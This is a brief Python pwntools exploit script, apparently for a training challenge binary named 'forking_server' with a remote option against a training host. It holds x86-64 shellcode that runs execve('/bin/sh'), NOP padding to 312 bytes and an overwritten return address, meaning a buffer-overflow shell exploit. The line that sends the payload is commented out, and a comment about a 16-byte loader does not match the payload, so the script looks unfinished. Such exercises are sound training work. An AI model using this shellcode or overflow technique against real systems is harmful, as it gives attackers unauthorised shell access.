from pwn import *

def pad_payload(payload: bytes, target_len: int) -> bytes:
    padding_len = target_len - len(payload)
    return payload + b"\x90" * padding_len

COMMANDS = """
"""

s= b"\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\xC7\xC0\x3B\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
shellcode = pad_payload(s, 312)
shellcode+= b"\x68\x0E\x01\x76\xB7\x7C\x00\x00"

if args.GDB:
    p = gdb.debug("./forking_server", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./forking_server")

# Send first stage loader (exactly 16 bytes)
#p.send(shellcode)

p.interactive()

#execve("/bin/sh\0", NULL, NULL)
#0x0068732f6e69622f


